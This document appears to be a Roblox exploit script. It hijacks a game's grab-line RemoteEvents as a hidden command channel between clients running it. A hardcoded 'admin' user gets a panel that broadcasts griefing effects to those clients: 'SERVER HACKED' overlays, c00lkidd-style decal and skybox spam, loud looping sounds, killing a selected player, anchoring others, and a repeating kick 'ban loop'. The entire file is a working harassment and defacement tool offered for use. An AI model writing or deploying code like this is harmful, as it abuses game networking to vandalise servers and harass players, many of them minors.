--[[ N3 Shared Channel ]]
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer

local PREFIX = "N3NET|"
local ADMIN_NAME = "hibdf13"
local IS_ADMIN = (LocalPlayer.Name == ADMIN_NAME or LocalPlayer.DisplayName == ADMIN_NAME)

local Peers = {} -- [UserId] = { name, display, lastSeen }
local SelectedUid = nil
local BanLoop = false

local function log(...)
	local t = {}
	for i = 1, select("#", ...) do
		local w = tostring(select(i, ...))
		if #w > 5 then
			w = w:sub(1, 5)
		end
		t[i] = w
	end
	print(table.concat(t, " "))
end

local GE = RS:WaitForChild("GrabEvents", 10)
if not GE then
	log("no", "grab")
	return
end
local Packet = GE:FindFirstChild("ExtendGrabLine")
local CGL = GE:FindFirstChild("CreateGrabLine")
if not Packet then
	log("no", "pkt")
	return
end

local function encode(cmd, data)
	data = tostring(data or ""):gsub("|", "/")
	return string.format("%s%s|%s|%d|%.2f", PREFIX, cmd, data, LocalPlayer.UserId, tick())
end

local function decode(s)
	if typeof(s) ~= "string" or s:sub(1, #PREFIX) ~= PREFIX then
		return nil
	end
	local rest = s:sub(#PREFIX + 1)
	local cmd, data, uid, ts = rest:match("^([^|]+)|([^|]*)|([^|]+)|([^|]+)$")
	if not cmd then
		return nil
	end
	return { cmd = cmd, data = data, userId = tonumber(uid) or 0, tick = tonumber(ts) or 0 }
end

local lastSend = 0
local function Broadcast(cmd, data)
	if tick() - lastSend < 0.12 then
		return false
	end
	lastSend = tick()
	local msg = encode(cmd, data)
	pcall(function()
		Packet:FireServer(msg)
	end)
	if CGL then
		pcall(function()
			CGL:FireServer(msg)
		end)
	end
	return true
end

local function getPlr(uid)
	uid = tonumber(uid)
	if not uid then
		return nil
	end
	for _, p in ipairs(Players:GetPlayers()) do
		if p.UserId == uid then
			return p
		end
	end
	return nil
end

-- ===== FX =====
local function FX_666()
	for _, v in ipairs(workspace:GetChildren()) do
		if v:IsA("BasePart") then
			local bbg = Instance.new("BillboardGui")
			bbg.Name = "stuf"
			bbg.Adornee = v
			bbg.Size = UDim2.new(2.5, 0, 2.5, 0)
			bbg.Parent = v
			local tlb = Instance.new("TextLabel")
			tlb.Text = "666 666 666 666 666 666"
			tlb.Font = Enum.Font.SourceSansBold
			tlb.TextSize = 48
			tlb.TextColor3 = Color3.new(1, 0, 0)
			tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
			tlb.Position = UDim2.new(-0.125, -22, -1.1, 0)
			tlb.BackgroundTransparency = 1
			tlb.Parent = bbg
		end
	end
	local function xds(dd)
		for _, v in ipairs(dd:GetChildren()) do
			if v:IsA("BasePart") then
				v.BrickColor = BrickColor.new("Really black")
				v.TopSurface = Enum.SurfaceType.Smooth
				v.BottomSurface = Enum.SurfaceType.Smooth
				local s = Instance.new("SelectionBox")
				s.Adornee = v
				s.Color3 = Color3.new(1, 0, 0)
				s.Parent = v
				local a = Instance.new("PointLight")
				a.Color = Color3.new(1, 0, 0)
				a.Range = 15
				a.Brightness = 5
				a.Parent = v
				local f = Instance.new("Fire")
				f.Size = 11
				f.Heat = 12
				f.Parent = v
			end
			Lighting.TimeOfDay = 0
			Lighting.Brightness = 0
			Lighting.ShadowColor = Color3.new(0, 0, 0)
			Lighting.Ambient = Color3.new(1, 0, 0)
			Lighting.FogEnd = 200
			Lighting.FogColor = Color3.new(0, 0, 0)
			if #v:GetChildren() > 0 then
				xds(v)
			end
		end
	end
	xds(workspace)

	-- overlay: server hacked + admin nick
	local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
	local gui = Instance.new("ScreenGui")
	gui.Name = "N3_666"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = pg
	local lb = Instance.new("TextLabel")
	lb.BackgroundColor3 = Color3.new(0, 0, 0)
	lb.BackgroundTransparency = 0.4
	lb.Size = UDim2.fromScale(1, 1)
	lb.Text = "SERVER HACKED\n" .. ADMIN_NAME
	lb.TextColor3 = Color3.new(1, 0, 0)
	lb.Font = Enum.Font.GothamBlack
	lb.TextScaled = true
	lb.Parent = gui

	-- reset after ~5s
	task.delay(5, function()
		if gui then
			gui:Destroy()
		end
		local char = LocalPlayer.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				hum.Health = 0
			end
			pcall(function()
				char:BreakJoints()
			end)
		end
	end)
end

local function FX_Hardstyle()
	local s = Instance.new("Sound")
	s.Name = "Sound"
	s.SoundId = "rbxassetid://8680587619"
	s.Volume = 10
	s.Looped = true
	s.Parent = workspace
	task.wait(0.3)
	s:Play()
end

local function FX_Shedletskyify()
	for _, plr in ipairs(Players:GetPlayers()) do
		local model = workspace:FindFirstChild(plr.Name)
		if model and model:FindFirstChild("Head") then
			local pe = Instance.new("ParticleEmitter")
			pe.Texture = "rbxassetid://187109143"
			pe.Parent = model.Head
		end
	end
	for _, w in ipairs(workspace:GetChildren()) do
		local pe = Instance.new("ParticleEmitter")
		pe.Texture = "rbxassetid://11741345802"
		pe.Parent = w
	end
	local a = Instance.new("Sky", Lighting)
	for _, v in ipairs({ "Bk", "Dn", "Ft", "Lf", "Rt", "Up" }) do
		a["Skybox" .. v] = "rbxassetid://172423468"
	end
end

local function decalspam(id)
	local function spamDecal(v)
		if v:IsA("BasePart") then
			for i = 0, 5 do
				local D = Instance.new("Decal")
				D.Name = "MYDECALHUE"
				D.Face = i
				D.Texture = "rbxassetid://" .. tostring(id)
				D.Parent = v
			end
		else
			for _, b in ipairs(v:GetChildren()) do
				spamDecal(b)
			end
		end
	end
	for _, v in ipairs(workspace:GetChildren()) do
		spamDecal(v)
	end
end

local function FX_K00pDecal()
	local msg = Instance.new("Message", workspace)
	msg.Text = "TEAM K00Pkidd Is Destroying!!!"
	task.delay(5.8, function()
		if msg then
			msg:Destroy()
		end
	end)
	local s = Instance.new("Sky")
	s.Name = "SKY"
	local id = "11588317701"
	for _, face in ipairs({ "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp" }) do
		s[face] = "rbxassetid://" .. id
	end
	s.Parent = Lighting
	local Spooky = Instance.new("Sound", workspace)
	Spooky.Name = "Spooky"
	Spooky.SoundId = "rbxassetid://152745539"
	Spooky.Volume = 10
	Spooky.Looped = true
	Spooky:Play()
	decalspam(11588317701)
end

local function FX_CK2Logo()
	local msg = Instance.new("Message", workspace)
	msg.Text = "Team c00lkidd2 join today!!"
	task.delay(5.8, function()
		if msg then
			msg:Destroy()
		end
	end)
	local s = Instance.new("Sky")
	s.Name = "SKY"
	local id = "11873267381"
	for _, face in ipairs({ "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp" }) do
		s[face] = "rbxassetid://" .. id
	end
	s.Parent = Lighting
	local Spooky = Instance.new("Sound", workspace)
	Spooky.Name = "Spooky"
	Spooky.SoundId = "rbxassetid://152745539"
	Spooky.Volume = 10
	Spooky.Looped = true
	Spooky:Play()
	decalspam(11873267381)
end

local function FX_Hint()
	local pg = LocalPlayer:FindFirstChild("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
	local holder = Instance.new("ScreenGui")
	holder.Name = "N3_Hint"
	holder.ResetOnSpawn = false
	holder.Parent = pg
	local msg = Instance.new("TextLabel")
	msg.Size = UDim2.new(1, 0, 0, 28)
	msg.Position = UDim2.new(0, 0, 0, 0)
	msg.BackgroundColor3 = Color3.new(0, 0, 0)
	msg.BackgroundTransparency = 0.3
	msg.TextColor3 = Color3.new(1, 1, 1)
	msg.Font = Enum.Font.SourceSansBold
	msg.TextSize = 18
	msg.Parent = holder
	local messages = {
		"SERVER HACKED · " .. ADMIN_NAME,
		"SERVER HACKED · " .. ADMIN_NAME,
		"SERVER HACKED · " .. ADMIN_NAME,
	}
	task.spawn(function()
		local i = 1
		while holder.Parent do
			msg.Text = messages[((i - 1) % #messages) + 1]
			i += 1
			task.wait(4)
		end
	end)
end

local function FX_Kill(uid)
	local plr = getPlr(uid)
	if not plr or plr == LocalPlayer then
		return
	end
	local char = plr.Character
	if not char then
		return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.Health = 0
	end
	pcall(function()
		char:BreakJoints()
	end)
end

local function FX_Kick(uid)
	-- soft kick: kill + try unload local if self
	local plr = getPlr(uid)
	if not plr then
		return
	end
	if plr == LocalPlayer then
		LocalPlayer:Kick("banned")
		return
	end
	FX_Kill(uid)
end

local function FX_AnchorOthers()
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and not Peers[plr.UserId] then
			local char = plr.Character
			if char then
				for _, p in ipairs(char:GetDescendants()) do
					if p:IsA("BasePart") then
						p.Anchored = true
					end
				end
			end
		end
	end
end

-- ===== Handlers =====
local Handlers = {
	["666"] = function()
		FX_666()
	end,
	["hard"] = function()
		FX_Hardstyle()
	end,
	["shed"] = function()
		FX_Shedletskyify()
	end,
	["k00p"] = function()
		FX_K00pDecal()
	end,
	["ck2"] = function()
		FX_CK2Logo()
	end,
	["hint"] = function()
		FX_Hint()
	end,
	["kill"] = function(meta)
		FX_Kill(meta.data)
	end,
	["kick"] = function(meta)
		FX_Kick(meta.data)
	end,
	["anch"] = function()
		FX_AnchorOthers()
	end,
	["join"] = function(meta, fromPlr)
		local uid = meta.userId
		if uid == LocalPlayer.UserId then
			return
		end
		local name = meta.data ~= "" and meta.data or (fromPlr and fromPlr.Name) or "?"
		Peers[uid] = {
			name = name,
			display = fromPlr and fromPlr.DisplayName or name,
			lastSeen = tick(),
		}
		log("peer", name)
		if IS_ADMIN then
			Broadcast("admn", LocalPlayer.Name)
			refreshPeerList()
		end
	end,
	["admn"] = function(meta)
		log("admn", meta.data)
	end,
	["ping"] = function(meta)
		local uid = meta.userId
		if Peers[uid] then
			Peers[uid].lastSeen = tick()
		end
	end,
}

local function HandlePayload(fromPlr, payload)
	local meta = decode(payload)
	if not meta or not meta.cmd then
		return
	end
	-- own join/admn/ping always process; own fx cmds skip (already ran locally)
	local skipSelfFx = {
		["666"] = true,
		hard = true,
		shed = true,
		k00p = true,
		ck2 = true,
		hint = true,
		anch = true,
	}
	if fromPlr == LocalPlayer and skipSelfFx[meta.cmd] then
		return
	end
	local fn = Handlers[meta.cmd]
	if fn then
		pcall(fn, meta, fromPlr)
	end
end

local function onClient(arg1, arg2, arg3)
	local player, payload
	if typeof(arg1) == "Instance" and arg1:IsA("Player") then
		player, payload = arg1, arg2
	elseif typeof(arg2) == "Instance" and arg2:IsA("Player") then
		player, payload = arg2, arg1
	else
		payload = typeof(arg1) == "string" and arg1 or (typeof(arg2) == "string" and arg2)
	end
	if typeof(payload) == "string" and payload:sub(1, #PREFIX) == PREFIX then
		HandlePayload(player, payload)
	end
	if typeof(arg3) == "string" and arg3:sub(1, #PREFIX) == PREFIX then
		HandlePayload(player, arg3)
	end
end

Packet.OnClientEvent:Connect(onClient)
if CGL then
	CGL.OnClientEvent:Connect(onClient)
end

-- announce join
task.defer(function()
	task.wait(0.5)
	Broadcast("join", LocalPlayer.Name)
	log("join", LocalPlayer.Name)
end)

-- heartbeat peers
task.spawn(function()
	while task.wait(8) do
		Broadcast("ping", LocalPlayer.Name)
		local now = tick()
		for uid, info in pairs(Peers) do
			if now - (info.lastSeen or 0) > 25 then
				Peers[uid] = nil
			end
		end
		if IS_ADMIN and refreshPeerList then
			refreshPeerList()
		end
	end
end)

-- ===== ADMIN UI only =====
function refreshPeerList() end

if not IS_ADMIN then
	log("ok", "cli")
	return
end

local pg = LocalPlayer:WaitForChild("PlayerGui")
local gui = Instance.new("ScreenGui")
gui.Name = "N3_Admin"
gui.ResetOnSpawn = false
gui.Parent = pg

local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(280, 420)
frame.Position = UDim2.new(0, 16, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
frame.BorderColor3 = Color3.fromRGB(200, 20, 20)
frame.BorderSizePixel = 2
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 28)
title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 14
title.Text = "N3 ADMIN · " .. ADMIN_NAME
title.Parent = frame

local function mkBtn(text, y, cb)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -16, 0, 28)
	b.Position = UDim2.new(0, 8, 0, y)
	b.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
	b.BorderColor3 = Color3.fromRGB(220, 40, 40)
	b.TextColor3 = Color3.new(1, 0.85, 0.85)
	b.Font = Enum.Font.GothamBold
	b.TextSize = 13
	b.Text = text
	b.Parent = frame
	b.MouseButton1Click:Connect(function()
		cb()
	end)
	return b
end

local function fireFx(cmd, data)
	-- local first
	local fn = Handlers[cmd]
	if fn then
		pcall(fn, { cmd = cmd, data = data or "", userId = LocalPlayer.UserId }, LocalPlayer)
	end
	Broadcast(cmd, data)
	log("sent", cmd)
end

mkBtn("666", 36, function()
	fireFx("666")
end)
mkBtn("HARDSTYLE SONG", 68, function()
	fireFx("hard")
end)
mkBtn("SHEDLETSKYIFY", 100, function()
	fireFx("shed")
end)
mkBtn("K00P DECALSPAM", 132, function()
	fireFx("k00p")
end)
mkBtn("CK2 LOGO", 164, function()
	fireFx("ck2")
end)
mkBtn("HINT", 196, function()
	fireFx("hint")
end)
mkBtn("ANCHOR OTHERS", 228, function()
	fireFx("anch")
end)

-- peer dropdown (simple scrolling list)
local peerLabel = Instance.new("TextLabel")
peerLabel.Size = UDim2.new(1, -16, 0, 20)
peerLabel.Position = UDim2.new(0, 8, 0, 262)
peerLabel.BackgroundTransparency = 1
peerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
peerLabel.Font = Enum.Font.Code
peerLabel.TextSize = 12
peerLabel.TextXAlignment = Enum.TextXAlignment.Left
peerLabel.Text = "peers: none"
peerLabel.Parent = frame

local peerBox = Instance.new("ScrollingFrame")
peerBox.Size = UDim2.new(1, -16, 0, 70)
peerBox.Position = UDim2.new(0, 8, 0, 284)
peerBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
peerBox.BorderSizePixel = 0
peerBox.ScrollBarThickness = 4
peerBox.CanvasSize = UDim2.new(0, 0, 0, 0)
peerBox.Parent = frame

refreshPeerList = function()
	for _, c in ipairs(peerBox:GetChildren()) do
		if c:IsA("TextButton") then
			c:Destroy()
		end
	end
	local y = 0
	local names = {}
	for uid, info in pairs(Peers) do
		table.insert(names, { uid = uid, info = info })
	end
	table.sort(names, function(a, b)
		return (a.info.name or "") < (b.info.name or "")
	end)
	peerLabel.Text = "peers: " .. #names .. (SelectedUid and (" · sel " .. tostring(SelectedUid)) or "")
	for _, row in ipairs(names) do
		local b = Instance.new("TextButton")
		b.Size = UDim2.new(1, -4, 0, 22)
		b.Position = UDim2.new(0, 2, 0, y)
		b.BackgroundColor3 = (SelectedUid == row.uid) and Color3.fromRGB(80, 0, 0) or Color3.fromRGB(30, 30, 30)
		b.TextColor3 = Color3.new(1, 1, 1)
		b.Font = Enum.Font.Code
		b.TextSize = 12
		b.Text = row.info.display .. " (@" .. row.info.name .. ")"
		b.Parent = peerBox
		local uid = row.uid
		b.MouseButton1Click:Connect(function()
			SelectedUid = uid
			refreshPeerList()
		end)
		y += 24
	end
	peerBox.CanvasSize = UDim2.new(0, 0, 0, y)
end

-- all players dropdown for kill/ban (not only peers)
local allLabel = Instance.new("TextLabel")
allLabel.Size = UDim2.new(1, -16, 0, 18)
allLabel.Position = UDim2.new(0, 8, 0, 356)
allLabel.BackgroundTransparency = 1
allLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
allLabel.Font = Enum.Font.Code
allLabel.TextSize = 11
allLabel.TextXAlignment = Enum.TextXAlignment.Left
allLabel.Text = "tgt: none"
allLabel.Parent = frame

local function cycleTarget()
	local list = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer then
			table.insert(list, p)
		end
	end
	if #list == 0 then
		SelectedUid = nil
		allLabel.Text = "tgt: none"
		return
	end
	local idx = 1
	for i, p in ipairs(list) do
		if p.UserId == SelectedUid then
			idx = i + 1
			break
		end
	end
	if idx > #list then
		idx = 1
	end
	SelectedUid = list[idx].UserId
	allLabel.Text = "tgt: " .. list[idx].Name
end

mkBtn("NEXT TARGET", 374, function()
	cycleTarget()
end)

-- move kill/ban/anchor bottom - resize frame buttons that were overlapping
-- Kill / Ban under target
local killBtn = Instance.new("TextButton")
killBtn.Size = UDim2.new(0.48, -10, 0, 28)
killBtn.Position = UDim2.new(0, 8, 0, 408)
killBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
killBtn.BorderColor3 = Color3.fromRGB(255, 50, 50)
killBtn.TextColor3 = Color3.new(1, 1, 1)
killBtn.Font = Enum.Font.GothamBold
killBtn.TextSize = 13
killBtn.Text = "KILL"
killBtn.Parent = frame
-- frame taller
frame.Size = UDim2.fromOffset(280, 480)
killBtn.Position = UDim2.new(0, 8, 0, 400)
killBtn.MouseButton1Click:Connect(function()
	if not SelectedUid then
		log("no", "tgt")
		return
	end
	fireFx("kill", tostring(SelectedUid))
end)

local banBtn = Instance.new("TextButton")
banBtn.Size = UDim2.new(0.48, -10, 0, 28)
banBtn.Position = UDim2.new(0.52, 0, 0, 400)
banBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
banBtn.BorderColor3 = Color3.fromRGB(255, 50, 50)
banBtn.TextColor3 = Color3.new(1, 1, 1)
banBtn.Font = Enum.Font.GothamBold
banBtn.TextSize = 13
banBtn.Text = "BAN LOOP"
banBtn.Parent = frame
banBtn.MouseButton1Click:Connect(function()
	if not SelectedUid then
		log("no", "tgt")
		return
	end
	BanLoop = not BanLoop
	banBtn.Text = BanLoop and "BAN ON" or "BAN LOOP"
	log("ban", BanLoop and "on" or "off")
	if BanLoop then
		local uid = SelectedUid
		task.spawn(function()
			while BanLoop and SelectedUid == uid do
				Broadcast("kick", tostring(uid))
				FX_Kick(uid)
				task.wait(5)
			end
		end)
	end
end)

log("ok", "admn")
refreshPeerList()
